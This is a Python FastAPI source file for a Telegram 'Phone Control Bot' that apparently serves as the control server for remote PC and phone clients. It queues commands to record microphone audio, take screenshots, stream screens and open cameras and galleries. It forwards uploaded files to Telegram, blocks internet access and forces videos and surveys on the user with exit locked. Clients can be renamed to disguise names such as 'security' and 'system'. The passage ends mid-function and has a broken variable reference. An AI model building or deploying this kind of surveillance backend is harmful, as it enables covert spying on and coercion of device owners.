from fastapi import FastAPI, Header, HTTPException, UploadFile, File, Form
from fastapi.responses import StreamingResponse
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from typing import Optional
import os
import asyncio
import httpx
from datetime import datetime
import uuid
import urllib.parse

app = FastAPI()

# ─── Fix для Amvera: health-check приходит на //health ───────────────────────

class NormalizeSlashMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        scope = request.scope
        if scope["path"].startswith("//"):
            scope["path"] = scope["path"][1:]
        return await call_next(request)

app.add_middleware(NormalizeSlashMiddleware)

# ─── Состояние ───────────────────────────────────────────────────────────────

devices: dict = {}

state = {
    "raw_links": [],
    "video_sessions": {},    # chat_id -> session
    "msg_sessions": {},      # chat_id -> {step, mode, questions[], answers[], cur_q, pending_cmd}
    "selected_device": {},   # chat_id -> device_id
    "questions": [],         # глобальный список вопросов опросника
    "micro_sessions": {},    # chat_id -> {step, dev_id, device_index, device_name}
}

# Уникальный ID этого запуска сервера — меняется при каждом рестарте
INSTANCE_ID = str(uuid.uuid4())[:8]

BOT_TOKEN        = os.environ.get("BOT_TOKEN", "")
ALLOWED_CHAT_ID  = os.environ.get("ALLOWED_CHAT_ID", "")
DEVICE_SECRET    = os.environ.get("DEVICE_SECRET", "mysecret42")
SELF_URL         = os.environ.get("SELF_URL", "")

VALID_NAMES = ["android", "security", "безопасность", "звонки", "system", "phonecontrol"]

# ─── Keep-alive ───────────────────────────────────────────────────────────────

async def keep_alive():
    await asyncio.sleep(60)
    while True:
        try:
            if SELF_URL:
                async with httpx.AsyncClient(timeout=10) as client:
                    await client.get(f"{SELF_URL}/health")
        except Exception as e:
            print(f"keep_alive error: {e}")
        await asyncio.sleep(270)

@app.on_event("startup")
async def startup():
    asyncio.create_task(keep_alive())

# ─── Telegram helpers ─────────────────────────────────────────────────────────

async def send_tg(chat_id: str, text: str, reply_markup=None):
    if not BOT_TOKEN:
        print("send_tg: BOT_TOKEN не задан!")
        return
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
            print(f"send_tg -> {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"send_tg error: {e}")

async def answer_callback(cb_id: str, text: str = ""):
    if not BOT_TOKEN:
        return
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": cb_id, "text": text}
            )
    except Exception as e:
        print(f"answer_callback error: {e}")

async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str, caption: str = ""):
    """Проксируем файл с телефона в Telegram без хранения."""
    if not BOT_TOKEN:
        return
    # Определяем метод по расширению
    ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
    if ext in ("jpg", "jpeg", "png", "webp", "gif"):
        method = "sendPhoto"
        field  = "photo"
    elif ext in ("mp4", "mov", "avi", "mkv", "3gp"):
        method = "sendVideo"
        field  = "video"
    else:
        method = "sendDocument"
        field  = "document"
    try:
        async with httpx.AsyncClient(timeout=60) as client:
            files = {field: (filename, file_bytes)}
            data  = {"chat_id": chat_id}
            if caption:
                data["caption"] = caption
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                data=data, files=files
            )
    except Exception as e:
        print(f"send_tg_file error: {e}")

# ─── Device helpers ───────────────────────────────────────────────────────────

def get_device(device_id: str) -> dict:
    if device_id not in devices:
        devices[device_id] = {
            "model": "Unknown",
            "last_seen": None,
            "active": False,
            "pending_commands": [],
            "command_callbacks": {},
        }
    return devices[device_id]

def device_online(device_id: str) -> bool:
    d = devices.get(device_id)
    if not d or not d["last_seen"]:
        return False
    return (datetime.now() - d["last_seen"]).total_seconds() < 120

def device_last_seen_str(device_id: str) -> str:
    d = devices.get(device_id)
    if not d or not d["last_seen"]:
        return "никогда"
    delta = int((datetime.now() - d["last_seen"]).total_seconds())
    return f"{delta} сек назад" if delta < 60 else f"{delta // 60} мин назад"

def selected_device_id(chat_id: str) -> Optional[str]:
    sel = state["selected_device"].get(chat_id)
    # Обратная совместимость: если хранится строка — возвращаем её
    if isinstance(sel, list):
        return sel[0] if len(sel) == 1 else None
    return sel

def selected_device_ids(chat_id: str) -> list[str]:
    """Возвращает список выбранных device_id для данного chat_id."""
    sel = state["selected_device"].get(chat_id)
    if sel is None:
        return []
    if sel == "all":
        return list(devices.keys())
    if isinstance(sel, list):
        return [d for d in sel if d in devices]
    # строка — один ID
    return [sel] if sel in devices else []

def require_device(chat_id: str):
    """Возвращает (dev_id, None) или (None, err) — для обратной совместимости.
    Если выбрано несколько — возвращает первый активный."""
    ids = require_devices(chat_id)
    if isinstance(ids, str):
        return None, ids   # это строка ошибки
    return ids[0], None

def require_devices(chat_id: str):
    """Возвращает список device_id или строку с ошибкой."""
    if not devices:
        return "⚠️ Нет подключённых устройств."
    ids = selected_device_ids(chat_id)
    if not ids:
        if len(devices) == 1:
            dev_id = next(iter(devices))
            state["selected_device"][chat_id] = dev_id
            ids = [dev_id]
        else:
            return "⚠️ Выбери устройство командой /devices"
    inactive = [i for i in ids if not devices[i]["active"]]
    active   = [i for i in ids if devices[i]["active"]]
    if not active:
        return "⚠️ Сначала включи режим командой /on"
    return active

# ─── Command queue ────────────────────────────────────────────────────────────

async def enqueue_command(chat_id: str, dev_id: str, cmd: dict, description: str):
    """Отправить команду на одно устройство."""
    import copy
    d = devices[dev_id]
    if not device_online(dev_id):
        await send_tg(chat_id,
            f"⚠️ Устройство оффлайн (ping: {device_last_seen_str(dev_id)})\nКоманда добавлена в очередь.")
    else:
        await send_tg(chat_id, "📡 Отправляю команду...")
    cmd_copy = copy.deepcopy(cmd)
    cmd_id = str(uuid.uuid4())[:8]
    cmd_copy["_id"] = cmd_id
    d["pending_commands"].append(cmd_copy)
    d["command_callbacks"][cmd_id] = chat_id
    await send_tg(chat_id, f"✅ Команда `{description}` в очереди (ID: `{cmd_id}`)")

async def enqueue_multi(chat_id: str, cmd: dict, description: str):
    """Отправить команду на все выбранные устройства."""
    ids = require_devices(chat_id)
    if isinstance(ids, str):
        await send_tg(chat_id, ids)
        return
    for dev_id in ids:
        await enqueue_command(chat_id, dev_id, cmd, description)

# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_keyboard():
    """Постоянная клавиатура с быстрыми кнопками."""
    return {
        "keyboard": [
            [{"text": "/status"}, {"text": "/devices"}],
            [{"text": "/on"},     {"text": "/help"}],
        ],
        "resize_keyboard": True,
        "persistent": True,
    }

def msg_mode_keyboard():
    return {"inline_keyboard": [[
        {"text": "💬 Обычное",   "callback_data": "msg_plain"},
        {"text": "✏️ С ответом", "callback_data": "msg_reply"},
        {"text": "📋 Опросник",  "callback_data": "msg_survey"},
    ]]}

def msg_minimize_keyboard():
    return {"inline_keyboard": [[
        {"text": "🖥 Свернуть всё + эффект", "callback_data": "msg_minimize_yes"},
        {"text": "▶️ Просто показать",        "callback_data": "msg_minimize_no"},
    ]]}

def video_mode_keyboard():
    return {"inline_keyboard": [[
        {"text": "▶️ Просто показать",   "callback_data": "vmsg_plain"},
        {"text": "✏️ С ответом",          "callback_data": "vmsg_reply"},
        {"text": "📋 С опросником",       "callback_data": "vmsg_survey"},
    ]]}

def video_lock_keyboard():
    return {"inline_keyboard": [[
        {"text": "🔓 Без блокировки",      "callback_data": "vlock_no"},
        {"text": "🔒 Заблокировать выход", "callback_data": "vlock_yes"},
    ]]}

def devices_keyboard(chat_id: str = ""):
    rows = []
    selected = state["selected_device"].get(chat_id)
    for dev_id, d in devices.items():
        status = "🟢" if device_online(dev_id) else "🔴"
        if selected == "all":
            mark = "✓ "
        elif isinstance(selected, list) and dev_id in selected:
            mark = "✓ "
        elif selected == dev_id:
            mark = "✓ "
        else:
            mark = ""
        rows.append([{"text": f"{mark}{status} {d['model']} ({dev_id[:6]})",
                      "callback_data": f"sel_{dev_id}"}])
    if len(devices) > 1:
        rows.append([{"text": "📡 Все устройства", "callback_data": "sel_all"}])
    return {"inline_keyboard": rows}

# ─── Video flow ───────────────────────────────────────────────────────────────

async def start_video_flow(chat_id: str, video_cmd: str, video_num: int = 0, video_url: str = "", raw_num: int = 0):
    """Сначала спрашиваем режим обратной связи, потом блокировку."""
    state["video_sessions"][chat_id] = {
        "step": "mode",
        "video_cmd": video_cmd,
        "video_num": video_num,
        "video_url": video_url,
        "raw_num": raw_num,
        "lock": False,
        "duration": 0,
        "fb_mode": "plain",
    }
    name = f"video{video_num}" if video_num else (f"raw{raw_num}" if raw_num else "raw видео")
    await send_tg(chat_id,
        f"🎬 *{name}*\n\nВыбери режим обратной связи:",
        reply_markup=video_mode_keyboard())

# ─── Msg session flow ─────────────────────────────────────────────────────────

async def start_msg_flow(chat_id: str, text: str, dev_id: str):
    state["msg_sessions"][chat_id] = {
        "step": "mode",
        "text": text,
        "dev_id": dev_id,
        "fb_mode": "plain",
    }
    await send_tg(chat_id,
        f"💬 *Сообщение:* _{text}_\n\nВыбери режим обратной связи:",
        reply_markup=msg_mode_keyboard())

# ─── Survey helpers ───────────────────────────────────────────────────────────

def build_survey_cmd(base_cmd: dict) -> dict:
    """Добавить список вопросов в команду."""
    base_cmd["survey"] = state["questions"]
    return base_cmd

# ─── Callback processing ──────────────────────────────────────────────────────

async def process_callback(callback: dict):
    chat_id = str(callback["message"]["chat"]["id"])
    data    = callback.get("data", "")
    cb_id   = callback["id"]

    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        await answer_callback(cb_id, "⛔ Нет доступа")
        return

    # ── Выбор устройства ─────────────────────────────────────────────────────
    if data.startswith("sel_"):
        dev_id = data[4:]

        # Выбрать все
        if dev_id == "all":
            state["selected_device"][chat_id] = "all"
            names = ", ".join(d["model"] for d in devices.values())
            await answer_callback(cb_id, "✅ Все устройства")
            await send_tg(chat_id,
                f"📡 Выбраны все устройства: *{names}*",
                reply_markup=devices_keyboard(chat_id))
            return

        if dev_id not in devices:
            await answer_callback(cb_id, "⚠️ Устройство не найдено")
            return

        # Мультивыбор: если уже выбрано одно/несколько — toggle этого девайса
        current = state["selected_device"].get(chat_id)
        if current == "all":
            # Снимаем "все", оставляем только этот
            selected_list = [dev_id]
        elif isinstance(current, list):
            if dev_id in current:
                selected_list = [d for d in current if d != dev_id] or [dev_id]
            else:
                selected_list = current + [dev_id]
        elif current and current != dev_id:
            # Был один — добавляем второй
            selected_list = [current, dev_id]
        else:
            selected_list = [dev_id]

        # Если один — храним строкой для совместимости, иначе списком
        state["selected_device"][chat_id] = selected_list[0] if len(selected_list) == 1 else selected_list

        sel = state["selected_device"][chat_id]
        if isinstance(sel, list):
            names = ", ".join(devices[i]["model"] for i in sel if i in devices)
            text = f"📱 Выбрано {len(sel)} устройства: *{names}*\n\nНажми ещё раз на устройство чтобы снять выбор."
        else:
            d = devices[sel]
            online = "🟢 онлайн" if device_online(sel) else "🔴 оффлайн"
            text = f"📱 Выбрано: *{d['model']}*\nID: `{sel}`\nСтатус: {online}"

        await answer_callback(cb_id, "✅")
        await send_tg(chat_id, text, reply_markup=devices_keyboard(chat_id))
        return

    # ── Режим сообщения (/msg flow) ───────────────────────────────────────────
    msess = state["msg_sessions"].get(chat_id)
    if msess and msess["step"] == "mode" and data in ("msg_plain", "msg_reply", "msg_survey"):
        mode_map = {"msg_plain": "plain", "msg_reply": "reply", "msg_survey": "survey"}
        msess["fb_mode"] = mode_map[data]
        await answer_callback(cb_id)

        if msess["fb_mode"] == "survey" and not state["questions"]:
            state["msg_sessions"].pop(chat_id, None)
            await send_tg(chat_id, "⚠️ Список вопросов пуст. Добавь через /addq <вопрос>")
            return

        # Для plain — спрашиваем про сворачивание; для остальных сразу отправляем
        if msess["fb_mode"] == "plain":
            msess["step"] = "minimize"
            await send_tg(chat_id, "🖥 Свернуть все окна перед показом?",
                          reply_markup=msg_minimize_keyboard())
        else:
            dev_id = msess["dev_id"]
            cmd = {"cmd": "show_message", "text": msess["text"], "fb_mode": msess["fb_mode"]}
            if msess["fb_mode"] == "survey":
                build_survey_cmd(cmd)
            if msess["fb_mode"] == "reply":
                cmd["reply_prompt"] = "✏️ Напиши ответ:"
            state["msg_sessions"].pop(chat_id, None)
            await enqueue_multi(chat_id, cmd, "сообщение")
        return

    if msess and msess["step"] == "minimize" and data in ("msg_minimize_yes", "msg_minimize_no"):
        msess["minimize"] = (data == "msg_minimize_yes")
        await answer_callback(cb_id)

        cmd = {
            "cmd": "show_message",
            "text": msess["text"],
            "fb_mode": "plain",
            "minimize": msess["minimize"],
        }
        state["msg_sessions"].pop(chat_id, None)
        await enqueue_multi(chat_id, cmd, "сообщение")
        return

    # ── Режим видео (fb mode) ─────────────────────────────────────────────────
    # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
    msess = state["micro_sessions"].get(chat_id)
    if msess and msess.get("step") == "choose_seconds":
        if not text.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
            return
        seconds = max(1, min(int(text), 300))
        state["micro_sessions"].pop(chat_id, None)
        dev_id = msess["dev_id"]
        device_index = msess["device_index"]
        device_name = msess["device_name"]
        await send_tg(chat_id,
            f"🎙 Записываю *{seconds} сек* с микрофона *{device_name}*...")
        await enqueue_command(chat_id, dev_id,
            {"cmd": "record_audio", "seconds": seconds, "device_index": device_index},
            f"запись микрофона {seconds} сек")
        return

    vsess = state["video_sessions"].get(chat_id)
    if vsess:
        if vsess["step"] == "mode" and data in ("vmsg_plain", "vmsg_reply", "vmsg_survey"):
            mode_map = {"vmsg_plain": "plain", "vmsg_reply": "reply", "vmsg_survey": "survey"}
            vsess["fb_mode"] = mode_map[data]
            vsess["step"] = "lock"
            await answer_callback(cb_id)
            if vsess["fb_mode"] == "survey" and not state["questions"]:
                state["video_sessions"].pop(chat_id, None)
                await send_tg(chat_id, "⚠️ Список вопросов пуст. Добавь через /addq <вопрос>")
                return
            name = f"video{vsess['video_num']}" if vsess["video_num"] else "raw видео"
            await send_tg(chat_id,
                f"🎬 *{name}*\n\nЗаблокировать выход?",
                reply_markup=video_lock_keyboard())
            return

        if vsess["step"] == "lock":
            if data == "vlock_no":
                vsess["lock"] = False
            elif data == "vlock_yes":
                vsess["lock"] = True
            else:
                await answer_callback(cb_id, "?")
                return
            vsess["step"] = "duration"
            await answer_callback(cb_id, "🔒" if vsess["lock"] else "🔓")
            await send_tg(chat_id,
                f"⏱ Сколько секунд обязательно смотреть? _(0 = смотреть видео до конца)_")
            return

    # ── Микрофон ──────────────────────────────────────────────────────────────
    elif data == "micro_cancel":
        state["micro_sessions"].pop(chat_id, None)
        await answer_callback(cb_id, "Отменено")
        await send_tg(chat_id, "❌ Запись отменена.")
        return

    elif data.startswith("micro_dev:"):
        sess = state["micro_sessions"].get(chat_id)
        if not sess:
            await answer_callback(cb_id, "Сессия устарела")
            return
        device_index = int(data.split(":")[1])
        device_name = next(
            (d["name"] for d in sess.get("devices_list", []) if d["index"] == device_index),
            str(device_index)
        )
        sess["device_index"] = device_index
        sess["device_name"] = device_name
        sess["step"] = "choose_seconds"
        state["micro_sessions"][chat_id] = sess
        await answer_callback(cb_id)
        await send_tg(chat_id,
            f"🎙 Выбран: *{device_name}*\n\n⏱ Сколько секунд записывать?\n(отправь число от 1 до 300)")
        return

    await answer_callback(cb_id, "?")

# ─── Message processing ───────────────────────────────────────────────────────

async def process_update(update: dict):
    print(f"process_update: {list(update.keys())}")
    if "callback_query" in update:
        await process_callback(update["callback_query"])
        return

    msg = update.get("message") or update.get("edited_message")
    if not msg:
        print("process_update: нет message, пропускаю")
        return

    chat_id = str(msg["chat"]["id"])
    text    = msg.get("text", "").strip()
    print(f"process_update: chat_id={chat_id}, ALLOWED={ALLOWED_CHAT_ID}, text={text!r}")

    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        await send_tg(chat_id, "⛔ Нет доступа.")
        return

    # ── Видео: ожидаем duration ───────────────────────────────────────────────
    # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
    msess = state["micro_sessions"].get(chat_id)
    if msess and msess.get("step") == "choose_seconds":
        if not text.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
            return
        seconds = max(1, min(int(text), 300))
        state["micro_sessions"].pop(chat_id, None)
        dev_id = msess["dev_id"]
        device_index = msess["device_index"]
        device_name = msess["device_name"]
        await send_tg(chat_id,
            f"🎙 Записываю *{seconds} сек* с микрофона *{device_name}*...")
        await enqueue_command(chat_id, dev_id,
            {"cmd": "record_audio", "seconds": seconds, "device_index": device_index},
            f"запись микрофона {seconds} сек")
        return

    vsess = state["video_sessions"].get(chat_id)
    if vsess and vsess["step"] == "duration":
        if not text.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (или 0)")
            return
        duration = int(text)
        vsess["duration"] = duration
        vsess["step"] = "done"
        state["video_sessions"].pop(chat_id, None)

        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return

        lock_str = "🔒 заблокирован" if vsess["lock"] else "🔓 без блокировки"
        dur_str  = f"{duration} сек" if duration > 0 else ("бесконечно" if vsess["lock"] else "без ограничения")
        await send_tg(chat_id, f"✅ Запускаю видео\nВыход: {lock_str}\nОбязательное время: {dur_str}")

        cmd = {"cmd": vsess["video_cmd"], "lock": vsess["lock"],
               "duration": duration, "fb_mode": vsess["fb_mode"]}
        if vsess["video_cmd"] == "video":
            cmd["num"] = vsess["video_num"]
            desc = f"video{vsess['video_num']}"
        else:
            cmd["raw_num"] = vsess.get("raw_num", 0)
            desc = f"raw{vsess.get('raw_num', '?')}"

        if vsess["fb_mode"] == "survey":
            build_survey_cmd(cmd)
        elif vsess["fb_mode"] == "reply":
            cmd["reply_prompt"] = "✏️ Напиши ответ:"

        await enqueue_multi(chat_id, cmd, desc)
        return

    # ── Команды ───────────────────────────────────────────────────────────────

    if text in ("/start", "/help"):
        cur = selected_device_id(chat_id)
        cur_str = f"\nУстройство: *{devices[cur]['model']}*" if cur and cur in devices else ""
        await send_tg(chat_id, (
            "📱 *Phone Control Bot*\n\n"
            "*Устройства:*\n"
            "/devices — выбрать устройство\n"
            f"{cur_str}\n\n"
            "*Управление:*\n"
            "/on /off /status\n\n"
            "*Команды:*\n"
            "/shutdown /dnd /ban /unban\n"
            "/msg <текст> — сообщение (выбор режима ОС)\n"
            "/sound <0-10>\n\n"
            "*Видео:*\n"
            "/video1 /video2 /video3\n"
            "/addraw <url> /lists /raw <n> /delvideo <n>\n"
            "/unbanvideo\n\n"
            "*Опросник:*\n"
            "/addq <вопрос> — добавить вопрос\n"
            "/delq <номер> — удалить вопрос\n"
            "/questions — список вопросов\n\n"
            "*Файлы с телефона:*\n"
            "/getfiles — открыть галерею на телефоне\n"
            "/camera — открыть камеру на телефоне\n"
            "/screenshot — скриншот экрана ПК\n\n"
            "*Прочее:*\n"
            f"/name <имя> | Имена: {', '.join(VALID_NAMES)}\n\n"
            "*Микрофон:*\n"
            "/micro <сек> — записать аудио с микрофона ПК\n\n"
            "*WiFi стриминг экрана ПК:*\n"
            "/stream\\_start — запустить трансляцию экрана\n"
            "/stream\\_stop — остановить трансляцию"
        ), reply_markup=main_keyboard())

    elif text == "/devices":
        if not devices:
            await send_tg(chat_id, "📵 Нет подключённых устройств.")
            return
        cur = selected_device_id(chat_id)
        cur_str = f"Выбрано: *{devices[cur]['model']}*\n\n" if cur and cur in devices else ""
        await send_tg(chat_id, f"📱 *Выбери устройство:*\n{cur_str}",
                      reply_markup=devices_keyboard(chat_id))

    elif text == "/on":
        if not devices:
            await send_tg(chat_id, "⚠️ Нет устройств.")
            return
        dev_id = selected_device_id(chat_id)
        if not dev_id or dev_id not in devices:
            if len(devices) == 1:
                dev_id = next(iter(devices))
                state["selected_device"][chat_id] = dev_id
            else:
                await send_tg(chat_id, "⚠️ Выбери устройство /devices")
                return
        devices[dev_id]["active"] = True
        devices[dev_id]["pending_commands"] = []
        online = "🟢 онлайн" if device_online(dev_id) else "🔴 оффлайн"
        await send_tg(chat_id, f"✅ *Включён*\n{devices[dev_id]['model']}: {online}")

    elif text == "/off":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            devices[dev_id]["active"] = False
            devices[dev_id]["pending_commands"] = []
            await send_tg(chat_id, f"🔕 Выключен для *{devices[dev_id]['model']}*.")

    elif text == "/status":
        if not devices:
            await send_tg(chat_id, "📵 Нет устройств.")
            return
        cur = selected_device_id(chat_id)
        lines = ["📊 *Статус*\n"]
        for dev_id, d in devices.items():
            m = "👉 " if dev_id == cur else "    "
            o = "🟢" if device_online(dev_id) else "🔴"
            lines.append(f"{m}{o} *{d['model']}* (`{dev_id[:6]}`)\n"
                         f"      ping: {device_last_seen_str(dev_id)} | "
                         f"режим: {'активен' if d['active'] else 'спит'} | "
                         f"очередь: {len(d['pending_commands'])}")
        await send_tg(chat_id, "\n".join(lines))

    elif text == "/shutdown":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "shutdown"}, "блокировка экрана")

    elif text == "/dnd":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "dnd_off"}, "отключить DnD")

    elif text == "/ban":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "ban"}, "блок интернета")

    elif text == "/unban":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "unban"}, "разблок интернета")

    elif text == "/screenshot":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "screenshot"}, "скриншот экрана")

    elif text.startswith("/msg "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        message = text[5:].strip()
        if not message:
            await send_tg(chat_id, "⚠️ Укажи текст: /msg Привет")
            return
        await start_msg_flow(chat_id, message, dev_id)

    elif text in ("/video1", "/video2", "/video3"):
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await start_video_flow(chat_id, "video", video_num=int(text[-1]))

    elif text.startswith("/sound"):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            parts = text.split()
            if len(parts) != 2 or not parts[1].isdigit() or not (0 <= int(parts[1]) <= 10):
                await send_tg(chat_id, "⚠️ /sound 0-10")
                return
            level = int(parts[1])
            await enqueue_multi(chat_id, {"cmd": "sound", "level": level}, f"громкость {level}/10")

    elif text.startswith("/addraw "):
        url = text[8:].strip()
        if not url.startswith("http"):
            await send_tg(chat_id, "⚠️ Некорректная ссылка.")
            return
        if "drive.google.com/file/d/" in url:
            try:
                fid = url.split("/file/d/")[1].split("/")[0]
                url = f"https://drive.google.com/uc?export=download&confirm=t&id={fid}"
            except: pass
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        await enqueue_multi(chat_id,
            {"cmd": "prefetch", "url": url}, "скачать видео")
        await send_tg(chat_id, "📥 Отправлено на скачивание. После завершения появится в /lists.")

    elif text == "/lists":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_multi(chat_id,
                {"cmd": "get_video_list"}, "список видео")
            await send_tg(chat_id, "⏳ Запрашиваю список видео с ПК...")

    elif text.startswith("/raw "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /raw 1")
            return
        num = int(parts[1])
        await start_video_flow(chat_id, "play_raw", raw_num=num)

    elif text.startswith("/delvideo "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /delvideo 1")
            return
        num = int(parts[1])
        await enqueue_multi(chat_id,
            {"cmd": "delete_video", "num": num}, f"удалить видео raw{num}")
        await send_tg(chat_id, f"🗑 Удаляю raw{num} с ПК...")

    elif text == "/unbanvideo":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "unban_video"}, "разблок видео")

    elif text.startswith("/name "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            name = text[6:].strip().lower()
            if name not in VALID_NAMES:
                await send_tg(chat_id, f"⚠️ Имена: {', '.join(VALID_NAMES)}")
                return
            await enqueue_multi(chat_id, {"cmd": "rename", "name": name}, f"rename {name}")

    # ── Опросник ─────────────────────────────────────────────────────────────
    elif text.startswith("/addq "):
        q = text[6:].strip()
        if not q:
            await send_tg(chat_id, "⚠️ /addq Как дела?")
            return
        state["questions"].append(q)
        await send_tg(chat_id,
            f"✅ Вопрос *{len(state['questions'])}* добавлен:\n_{q}_")

    elif text.startswith("/delq "):
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /delq 1")
            return
        num = int(parts[1])
        if num < 1 or num > len(state["questions"]):
            await send_tg(chat_id, f"⚠️ Нет вопроса {num}.")
            return
        removed = state["questions"].pop(num - 1)
        await send_tg(chat_id, f"🗑 Удалён вопрос {num}: _{removed}_")

    elif text == "/questions":
        if not state["questions"]:
            await send_tg(chat_id, "📭 Вопросов нет. /addq <вопрос>")
            return
        lines = ["📋 *Список вопросов опросника:*\n"]
        for i, q in enumerate(state["questions"], 1):
            lines.append(f"{i}. {q}")
        await send_tg(chat_id, "\n".join(lines))

    # ── Файлы ────────────────────────────────────────────────────────────────
    elif text == "/getfiles":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "open_gallery"}, "открыть галерею")

    elif text == "/camera":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "open_camera"}, "открыть камеру")

    elif text == "/stream_start":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "stream_start"}, "запуск стриминга экрана")

    elif text == "/stream_stop":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "stream_stop"}, "остановка стриминга")

    elif text == "/micro":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            # Запрашиваем список микрофонов с ПК
            state["micro_sessions"][chat_id] = {"step": "waiting_devices", "dev_id": dev_id}
            await enqueue_command(chat_id, dev_id,
                {"cmd": "get_audio_devices"},
                "запрос списка микрофонов")
            await send_tg(chat_id, "⏳ Запрашиваю список микрофонов...")

    else:
        await send_tg(chat_id, "❓ /help", reply_markup=main_keyboard())


# ─── Webhook ──────────────────────────────────────────────────────────────────

@app.post("/webhook")
async def webhook(update: dict):
    asyncio.create_task(process_update(update))
    return {"ok": True}


# ─── Upload endpoint (Android → TG proxy) ────────────────────────────────────

@app.post("/upload")
async def upload(
    file: UploadFile = File(...),
    x_device_secret: Optional[str] = Header(None),
    x_device_id: Optional[str] = Header(None),
    x_chat_id: Optional[str] = Header(None),
    x_caption: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    dev_id  = x_device_id or "default"
    chat_id = x_chat_id or ALLOWED_CHAT_ID
    if not chat_id:
        raise HTTPException(status_code=400, detail="No chat_id")

    data     = await file.read()        # читаем в память — не сохраняем на диск
    filename = file.filename or "file"
    caption  = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"

    asyncio.create_task(send_tg_file(chat_id, data, filename, caption))
    return {"ok": True, "size": len(data)}


# ─── Video list endpoint (ПК присылает список raw-видео) ────────────────────────

@app.post("/video_list")
async def video_list_endpoint(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    videos = body.get("videos", [])  # [{name, filename}, ...]

    if not videos:
        await send_tg(chat_id, "📭 На ПК нет скачанных видео. Добавь через /addraw <url>")
        return {"ok": True}

    lines = ["📋 *Видео на ПК:*\n"]
    for v in videos:
        fname = v['filename'].replace('.', '\\.')
        lines.append(f"`{v['name']}` — {fname}")
    lines.append("\n▶️ /raw <номер> — воспроизвести")
    lines.append("🗑 /delvideo <номер> — удалить")
    await send_tg(chat_id, "\n".join(lines))
    return {"ok": True}


# ─── Micro devices endpoint (ПК присылает список микрофонов) ────────────────────

@app.post("/micro_devices")
async def micro_devices(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    devices_list = body.get("devices", [])  # [{index, name}, ...]

    if not chat_id or not devices_list:
        return {"ok": False}

    # Сохраняем список в сессию
    sess = state["micro_sessions"].get(chat_id, {})
    sess["step"] = "choose_device"
    sess["dev_id"] = body.get("device_id", "")
    sess["devices_list"] = devices_list
    state["micro_sessions"][chat_id] = sess

    # Строим inline кнопки с микрофонами
    rows = []
    for d in devices_list:
        rows.append([{"text": f"🎙 {d['name'][:40]}", "callback_data": f"micro_dev:{d['index']}"}])
    rows.append([{"text": "❌ Отмена", "callback_data": "micro_cancel"}])

